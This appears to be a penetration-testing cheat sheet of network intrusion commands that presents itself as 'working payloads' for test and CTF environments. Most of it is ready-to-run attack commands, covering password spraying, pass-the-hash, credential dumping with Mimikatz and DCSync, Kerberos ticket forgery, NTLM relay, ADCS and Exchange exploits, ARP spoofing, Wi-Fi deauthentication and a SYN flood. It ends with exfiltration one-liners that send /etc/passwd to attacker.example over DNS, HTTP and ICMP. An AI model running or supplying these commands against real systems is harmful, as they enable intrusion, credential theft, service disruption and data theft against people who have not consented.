# Network Payloads & Intrusion Techniques

A collection of working payloads and commands for network-level security testing. Organized by protocol and technique. All payloads are functional against test/CTF environments.

---

## Port Scanning

```bash
# TCP Connect scan
nmap -sT target

# SYN stealth scan (requires root)
nmap -sS target

# UDP scan
nmap -sU target

# Version detection
nmap -sV target

# OS detection
nmap -O target

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A target

# Script-based vulnerability detection
nmap --script=vuln target

# SMB enumeration
nmap --script=smb-enum-shares,smb-enum-users target

# HTTP enumeration
nmap --script=http-enum,http-vuln* -p 80,443 target

# Fast scan (common ports)
nmap -F target

# Specific port range
nmap -p 22,80,443 target
nmap -p 1-10000 target

# Output formats
nmap -oN output.txt target
nmap -oX output.xml target
nmap -oG output.grepable target
```

---

## Web Fuzzing / Directory Discovery

```bash
# Directory brute force
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt

# Extension fuzzing
gobuster dir -u http://target -w wordlist.txt -x php,html,txt,jsp,asp

# Subdomain discovery
gobuster dns -d target.com -w subdomains.txt
ffuf -u http://target.com -w subdomains.txt -H "Host: FUZZ.target.com"

# Parameter fuzzing
ffuf -u 'http://target/page?FUZZ=test' -w params.txt
ffuf -u 'http://target/page?param=FUZZ' -w values.txt

# POST body fuzzing
ffuf -u http://target/api -X POST -H "Content-Type: application/json" -d '{"user":"FUZZ"}' -w users.txt

# Recursive discovery
gobuster dir -u http://target -w wordlist.txt -r

# Authenticated scanning
gobuster dir -u http://target -w wordlist.txt -c "PHPSESSID=xxx"
gobuster dir -u http://target -w wordlist.txt -H "Authorization: Bearer token"

# Thread control
gobuster dir -u http://target -w wordlist.txt -t 50
```

---

## SMB Enumeration & Attack

```bash
# Scan network for SMB services
crackmapexec smb 192.168.1.0/24

# Password spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123

# Credential validation
crackmapexec smb target -u admin -p password

# Pass-the-Hash
crackmapexec smb target -u admin -H NTHASH

# Remote command execution via SMB
crackmapexec smb target -u admin -p password -x "whoami"

# PowerShell execution via SMB
crackmapexec smb target -u admin -p password -X "Get-Process"

# SAM dump
crackmapexec smb target -u admin -p password --sam

# LSASS extraction
crackmapexec smb target -u admin -p password --lsa

# Mimikatz
crackmapexec smb target -u admin -p password -M mimikatz

# WinRM access
crackmapexec winrm target -u admin -p password

# SMB shares enumeration
smbclient -L //target -U admin
smbmap -H target -u admin -p password
```

---

## Active Directory / Kerberos Attacks

```bash
# Kerberoasting
impacket-GetUserSPNs domain/user:password -dc-ip dc_ip -request

# AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat

# Pass-the-Hash (PsExec)
impacket-psexec domain/user@target -hashes LMHASH:NTHASH

# Pass-the-Hash (WMI)
impacket-wmiexec domain/user@target -hashes LMHASH:NTHASH

# Scheduled task execution
impacket-atexec domain/user@target -hashes LMHASH:NTHASH "command"

# SMB exec
impacket-smbexec domain/user@target -hashes LMHASH:NTHASH

# DCSync attack (extract all domain hashes)
impacket-secretsdump domain/user:password@dc_target

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# Golden Ticket (using Mimikatz on domain controller)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /user:Administrator /id:500 /ptt

# Silver Ticket
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:target.domain.local /service:HOST /rc4:service_hash /user:Administrator /id:500 /ptt

# DCOM lateral movement
impacket-dcomexec domain/user:password@target
```

---

## LLMNR / NBT-NS Poisoning

```bash
# Start responder to capture NetNTLM hashes
responder -I eth0

# Passive analysis mode
responder -I eth0 -A

# Responder with specific challenge
responder -I eth0 -i 127.0.0.1 -r OFF

# Inveigh (Windows equivalent for LLMNR/NBNS/mDNS spoofing)
powershell -exec bypass -c "Import-Module Inveigh.ps1; Invoke-Inveigh -NBNS Y -mDNS Y -Proxy Y"
```

---

## Network Sniffing / MITM

```bash
# ARP spoofing
arpspoof -i eth0 -t target gateway
arpspoof -i eth0 -t gateway target

# BetterCAP full MITM
bettercap -eval "set arp.spoof.targets target; arp.spoof on; net.sniff on"

# Ettercap ARP poisoning
ettercap -T -M arp:remote /target// /gateway//

# tcpdump capture
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 host target
tcpdump -i eth0 port 80 or port 443

# Extract HTTP credentials from pcap
tcpdump -r capture.pcap -A | grep -i "Authorization: Basic"
```

---

## Protocol-Specific Attacks

### DNS

```bash
# DNS zone transfer
dig axfr @dns_server target.com
host -l target.com dns_server

# DNS enumeration
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -D subdomains.txt -t brt

# Subdomain brute force
dnsenum target.com
```

### LDAP

```bash
# LDAP anonymous bind check
ldapsearch -h target -p 389 -x -s base namingcontexts

# LDAP user enumeration
ldapsearch -h target -p 389 -x -b "DC=domain,DC=local"

# LDAP authenticated query
ldapsearch -h target -p 389 -x -D "CN=user,CN=Users,DC=domain,DC=local" -w password -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### MSSQL

```bash
# MSSQL client access (via Impacket)
impacket-mssqlclient domain/user:password@target

# MSSQL via Windows auth
sqlcmd -S target -U domain\\user -P password

# Enable xp_cmdshell
sqlcmd -S target -U sa -P password -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'"
```

### RDP

```bash
# RDP client connection
xfreerdp /v:target /u:user /p:password

# RDP with pass-the-hash (restricted admin mode)
xfreerdp /v:target /u:user /pth:NTHASH

# RDP security check
nmap -p 3389 --script=rdp-sec-check target
```

### WinRM

```bash
# WinRM connection
evil-winrm -i target -u user -p password

# WinRM via pass-the-hash
evil-winrm -i target -u user -H NTHASH

# Execute commands via WinRM
crackmapexec winrm target -u user -p password -x "whoami"
```

---

## Tunneling & Proxying

```bash
# SSH local port forward
ssh -L 8080:internal:80 user@gateway

# SSH remote port forward
ssh -R 8080:localhost:80 user@public_server

# SSH dynamic (SOCKS proxy)
ssh -D 1080 user@gateway

# Chisel SOCKS tunnel (client -> server)
# Server:
chisel server -p 8080 --reverse
# Client:
chisel client server_ip:8080 R:socks

# Frp reverse proxy
# server: frps -c frps.ini
# client: frpc -c frpc.ini

# Ligolo-ng layer 2 tunneling
# Agent: ligolo-ng-agent -connect attacker_ip:11601
# Proxy: ligolo-ng-proxy -hack 0.0.0.0:11601

# Plink (Windows SSH tunneling for Windows targets)
plink.exe -l user -pw password -R 8080:localhost:80 gateway

# socat relay
socat TCP-LISTEN:4444,fork TCP:target:80
```

---

## Password Attacks

```bash
# SSH brute force
hydra -l root -P passwords.txt ssh://target
medusa -u root -P passwords.txt -M ssh -h target

# HTTP form brute force
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP brute force
hydra -l admin -P passwords.txt ftp://target

# MySQL brute force
hydra -l root -P passwords.txt mysql://target

# RDP brute force
hydra -l administrator -P passwords.txt rdp://target

# Hash cracking (hashcat)
hashcat -m 1000 ntlm_hash.txt wordlist.txt    # NTLM
hashcat -m 13100 kerberos_hash.txt wordlist.txt # Kerberos TGS-REP
hashcat -m 18200 asrep_hash.txt wordlist.txt    # AS-REP
hashcat -m 5600 netntlmv2_hash.txt wordlist.txt # NetNTLMv2

# Hash cracking (john)
john --wordlist=wordlist.txt hash.txt
```

---

## Certificate Services (ADCS) Attacks

```bash
# ESC1 - Misconfigured certificate template (SAN specification)
certipy req -u user@domain -p password -ca CA-SERVER -target dc.domain.local -template VulnTemplate -upn administrator@domain

# ESC8 - NTLM relay to ADCS Web Enrollment
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs

# Certipy discovery
certipy find -u user@domain -p password -dc-ip dc_ip

# Certipy authentication with certificate
certipy auth -pfx admin.pfx -dc-ip dc_ip
```

---

## Exchange Attacks

```bash
# Exchange ProxyLogon (CVE-2021-26855)
python3 proxylogon.py -t exchange.domain.local -u admin@domain --dump

# Exchange ProxyShell
python3 proxyshell.py -t exchange.domain.local

# MailSniper (Exchange user enumeration)
powershell -exec bypass -c "Import-Module MailSniper.ps1; Invoke-DomainHarvestOWA -ExchHostname mail.domain.local"

# Ruler (Exchange client-side rule abuse)
ruler -d domain.local -u user -p password -e admin -m mapi display
ruler -d domain.local -u user -p password add --location "\\attacker\share\malicious.exe" --trigger "from:attacker"
```

---

## Wireless Attacks

```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon

# Deauth attack
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon

# Crack handshake
aircrack-ng -w wordlist.txt capture-01.cap

# WPA3 downgrade attack
# Forge WPA2 beacon to force downgrade
```

---

## IoT / Embedded Network Attacks

```bash
# UPnP discovery
upnp-inspector

# Telnet default credential scan
nmap -p 23 --script=telnet-brute target

# SNMP community string brute force
nmap -sU -p 161 --script=snmp-brute target
onesixtyone -c community.txt -i targets.txt

# MQTT enumeration
mosquitto_sub -h target -t "#" -v
```

---

## Packet Crafting

```bash
# TCP SYN flood
hping3 -S -p 80 --flood target

# TCP RST detection
hping3 -R target -p 80

# ICMP timestamp scan
hping3 --icmptype 13 target

# Packet forging with Scapy (Python)
python3 -c "
from scapy.all import *
send(IP(dst='target')/TCP(dport=80, flags='S'))
"
```

---

## Proxy / Tunneling Tools

```bash
# Burp Suite proxy listener
# Proxy -> Options -> Proxy Listeners -> Add : Port 8080

# Intercept toggle
# Proxy -> Intercept -> Intercept is on/off

# Send to Repeater
# Right click -> Send to Repeater (Ctrl+R)

# Send to Intruder  
# Right click -> Send to Intruder (Ctrl+I)

# Intruder attack types
# Sniper: single payload list
# Battering ram: same payload for all positions
# Pitchfork: multiple payload sets (parallel)
# Cluster bomb: multiple payload sets (cartesian product)

# Active scan
# Dashboard -> New Scan -> select target URL

# Install BApp plugins
# Extender -> BApp Store -> select -> Install
```

---

## Data Exfiltration

```bash
# DNS exfiltration
# Encode data as DNS subdomain queries
dig @attacker_dns $(base64 /etc/passwd | tr -d '\n' | cut -c1-50).attacker.example

# HTTP/S exfiltration
curl -X POST -d @/etc/passwd http://attacker.example/exfil

# ICMP exfiltration
ping -p $(printf "deadbeef" | xxd -p) -c 1 attacker.example

# SMB exfiltration (to attacker SMB share)
copy sensitive.txt \\attacker\share\data.txt

# DNS tunneling via dnscat2
# Server: ruby dnscat2.rb attacker_domain
# Client: dnscat2 --dns server=attacker_domain
```
